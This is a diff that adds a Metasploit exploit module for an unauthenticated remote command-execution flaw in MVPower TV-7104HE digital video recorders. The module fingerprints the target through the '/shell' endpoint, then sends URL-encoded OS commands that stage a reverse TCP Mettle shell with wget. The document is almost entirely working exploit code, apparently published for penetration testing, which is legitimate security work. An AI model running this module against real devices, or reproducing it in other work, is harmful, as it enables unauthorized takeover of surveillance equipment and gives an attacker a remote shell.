@@ -1,0 +1,97 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  HttpFingerprint = { :pattern => [ /JAWS\/1\.0/ ] }
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'MVPower DVR Shell Unauthenticated Command Execution',
+      'Description' => %q{
+        This module exploits an unauthenticated remote command execution
+        vulnerability in MVPower digital video recorders. The 'shell' file
+        on the web interface executes arbitrary operating system commands in
+        the query string.
+
+        This module was tested successfully on a MVPower model TV-7104HE with
+        firmware version 1.8.4 115215B9 (Build 2014/11/17).
+
+        The TV-7108HE model is also reportedly affected, but untested.
+      },
+      'Author'      =>
+        [
+          'Paul Davies (UHF-Satcom)', # Initial vulnerability discovery and PoC
+          'Andrew Tierney (Pen Test Partners)', # Independent vulnerability discovery and PoC
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'linux',
+      'References'  =>
+        [
+          # Comment from Paul Davies contains probably the first published PoC
+          [ 'URL', 'https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/' ],
+          # Writeup with PoC by Andrew Tierney from Pen Test Partners
+          [ 'URL', 'https://www.pentestpartners.com/blog/pwning-cctv-cameras/' ]
+        ],
+      'DisclosureDate' => 'Aug 23 2015',
+      'Privileged'     => true, # BusyBox
+      'Arch'           => ARCH_ARMLE,
+      'DefaultOptions' =>
+        {
+          'PAYLOAD' => 'linux/armle/mettle_reverse_tcp',
+          'CMDSTAGER::FLAVOR' => 'wget'
+        },
+      'Targets'        =>
+        [
+          ['Automatic', {}]
+        ],
+      'CmdStagerFlavor' => %w{ echo printf wget },
+      'DefaultTarget'   => 0))
+  end
+
+  def check
+    begin
+      fingerprint = Rex::Text::rand_text_alpha(rand(10) + 6)
+      res = send_request_cgi(
+        'uri' => "/shell?echo+#{fingerprint}",
+        'headers' => { 'Connection' => 'Keep-Alive' }
+      )
+      if res && res.body.include?(fingerprint)
+        return CheckCode::Vulnerable
+      end
+    rescue ::Rex::ConnectionError
+      return CheckCode::Unknown
+    end
+    CheckCode::Safe
+  end
+
+  def execute_command(cmd, opts)
+    begin
+      send_request_cgi(
+        'uri' => "/shell?#{Rex::Text.uri_encode(cmd, 'hex-all')}",
+        'headers' => { 'Connection' => 'Keep-Alive' }
+      )
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+
+  def exploit
+    print_status("#{peer} - Connecting to target")
+
+    unless check == CheckCode::Vulnerable
+      fail_with(Failure::Unknown, "#{peer} - Target is not vulnerable")
+    end
+
+    print_good("#{peer} - Target is vulnerable!")
+
+    execute_cmdstager(linemax: 1500)
+  end
+end
